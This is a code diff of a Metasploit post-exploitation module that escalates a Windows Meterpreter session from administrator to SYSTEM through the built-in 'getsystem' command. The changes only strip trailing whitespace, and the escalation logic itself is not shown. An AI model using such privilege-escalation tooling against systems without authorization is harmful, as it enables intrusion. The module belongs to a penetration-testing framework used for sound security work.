@@ -18,14 +18,14 @@ require 'msf/core/post/windows/priv'
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::Windows::Priv
-	
+
 	def initialize(info={})
 		super(update_info(info,
 			'Name'          => 'Windows Escalate Get System via Administrator',
 			'Description'   => %q{
 					This module uses the builtin 'getsystem' command to escalate
 				the current session to the SYSTEM account from an administrator
-				user account. 
+				user account.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        => 'hdm',
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Post
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
-		
+
 		register_options([
 			OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
 		], self.class)
@@ -50,7 +50,7 @@ class Metasploit3 < Msf::Post
 		tech = datastore['TECHNIQUE'].to_i
 
 		unsupported if client.platform !~ /win32|win64/i
-		
+
 		if is_system?
 			print_good("This session already has SYSTEM privileges")
 			return
